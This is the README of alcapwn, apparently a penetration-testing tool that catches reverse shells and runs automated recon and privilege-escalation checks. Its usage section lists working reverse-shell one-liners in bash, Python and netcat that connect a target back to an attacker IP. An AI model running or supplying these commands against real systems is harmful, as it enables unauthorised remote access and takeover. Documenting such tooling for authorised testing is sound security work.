<p align="center">
  <img src="alcapwn_logo.png" alt="alcapwn" width="400">
<br />
Reverse shell catcher with automated recon and privesc detection.
</p>

## Usage

```bash
go build -o alcapwn && ./alcapwn -l 0.0.0.0:4444
```

On the target:

```bash
# Bash
bash -i >& /dev/tcp/<ip>/4444 0>&1

# Python
python3 -c 'import socket,os,pty; s=socket.socket(); s.connect(("<ip>",4444)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("/bin/bash")'

# Netcat
nc -e /bin/sh <ip> 4444
```

## What it does

Catches the shell, upgrades to PTY, runs recon, and prints a summary:

- Identity, OS, kernel
- Sudo NOPASSWD rules
- SUID/SGID binaries matched against GTFOBins
- CVE candidates (PwnKit, Baron Samedit, sudo bypass)
- Capabilities, writable crons, interesting files
- Running services and versions

After the summary, drops you into an interactive shell. `Ctrl+D` to close.

Findings saved to `findings/` as JSON and raw output.

## Security Notes

alcapwn defends against pbsh-style attacks (ANSI fragmentation, nonce reflection, DCS/PM injection). These limitations are documented in `alcapwn_manual.md`.

## License

MIT — **Pwn responsibly.** Always have explicit permission.
